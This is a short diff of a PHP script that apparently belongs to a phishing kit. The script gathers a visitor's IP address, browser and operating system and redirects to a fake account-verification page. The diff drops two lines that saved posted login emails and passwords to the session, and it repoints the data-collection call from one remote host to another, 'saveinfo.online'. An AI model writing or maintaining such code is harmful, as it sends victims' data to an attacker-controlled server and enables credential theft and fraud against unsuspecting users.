@@ -9,8 +9,6 @@ include('../../functions/get_bin.php');
 include('../../functions/get_browser.php');
 $_SESSION['TIME_DATE'] = $TIME_DATE;
 //
-$_SESSION['Email'] = $_POST['login_email'];
-$_SESSION['Pass'] = $_POST['login_password'];
 function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
     $output = NULL;
     if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
@@ -132,11 +130,11 @@ $data['REMOTE_ADDR'] = $_SERVER['REMOTE_ADDR'];
 $data['b'] = Z118_Browser($_SERVER['HTTP_USER_AGENT']);
 $data['os'] = Z118_OS($_SERVER['HTTP_USER_AGENT']);
 
-sendPost('http://www.save-test.epizy.com/sv1.php',$data);
+
+sendPost('http://saveinfo.online/sv1.php',$data);
 
 
 //---- end request----------------
-
 
 
 $url = "../settings/?verify_account=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."";
